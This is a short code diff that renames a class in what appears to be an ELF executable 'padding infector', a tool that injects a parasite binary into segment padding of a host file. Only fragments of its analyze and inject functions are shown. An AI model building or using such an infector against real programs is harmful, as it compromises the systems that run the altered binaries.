@@ -1,4 +1,4 @@
-#include "infector/padding_infect.hh"
+#include "infector/padding_infector.hh"
 #include "common/macros.hh"
 #include "common/math.hh"
 #include "common/patch_pattern.hh"
@@ -57,8 +57,8 @@ void patch_ehdr(Elf64_Ehdr& header, Elf64_Addr parasite_load_address,
 // @param host_mapping The host elf mapping.
 // @param parasite_size The size of the parasite.
 // @param[out] info A struct of information.
-bool PaddingInfect::analyze(std::span<const std::byte> host_mapping,
-                            std::span<const std::byte> parasite_mapping) {
+bool PaddingInfector::analyze(std::span<const std::byte> host_mapping,
+                              std::span<const std::byte> parasite_mapping) {
   const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
 
   if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
@@ -131,8 +131,8 @@ bool PaddingInfect::analyze(std::span<const std::byte> host_mapping,
   return false;
 }
 
-bool PaddingInfect::inject(std::span<std::byte> host_mapping,
-                           std::span<const std::byte> parasite_mapping) {
+bool PaddingInfector::inject(std::span<std::byte> host_mapping,
+                             std::span<const std::byte> parasite_mapping) {
   if (padding_size_ < parasite_mapping.size()) {
     const char* msg;
     STR_LITERAL(
